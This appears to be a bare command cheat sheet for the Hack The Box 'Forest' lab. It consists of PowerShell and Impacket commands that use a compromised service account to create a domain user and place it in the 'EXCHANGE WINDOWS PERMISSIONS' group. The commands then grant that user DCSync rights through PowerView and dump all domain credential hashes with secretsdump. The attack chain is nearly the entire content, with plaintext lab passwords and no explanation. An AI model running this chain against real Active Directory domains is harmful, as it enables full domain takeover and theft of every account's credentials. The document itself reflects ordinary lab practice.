# ADD USER TO DOMAIN
Using compromised user svc-alfresco
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\svc-alfresco', $SecPassword)
New-ADUser -Name 'naiame' -GivenName 'naiame' -Surname 'Naiame' -UserPrincipalName 'Naiame' -AccountPassword (ConvertTo-SecureString 'naiameS3Cur3' -AsPlainText -Force) -Enabled 1
Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'naiame' -Credential $Cred -Verbose
Get-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS'

# GRANT DCSync Permission to new user
Add-DomainObjectAcl -TargetIdentity naiame[Privileged user to grant rights] -PrincipalIdentity naiame[USER TO SYNC DC] -Rights DCSync -Verbose



upload PowerView.ps1
import-module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB.local\svc-alfresco', $SecPassword)
 
New-ADUser -Name 'rea' -GivenName 'rea' -Surname 'REA' -UserPrincipalName 'rea' -AccountPassword (ConvertTo-SecureString 'Spymd33reamn*' -AsPlainText -Force) -Enabled 1
 
Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'rea' -Credential $Cred -Verbose
Get-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS'
 
 
$SecPassword = ConvertTo-SecureString 'Spymd33reamn*' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\rea', $SecPassword)
 
Add-DomainObjectAcl -TargetIdentity htb -PrincipalIdentity rea -Rights DCSync  -Credential $Cred -Verbose
 
 
secretsdump -dc-ip 10.10.10.161  htb.local/rea@forest -target-ip 10.10.10.161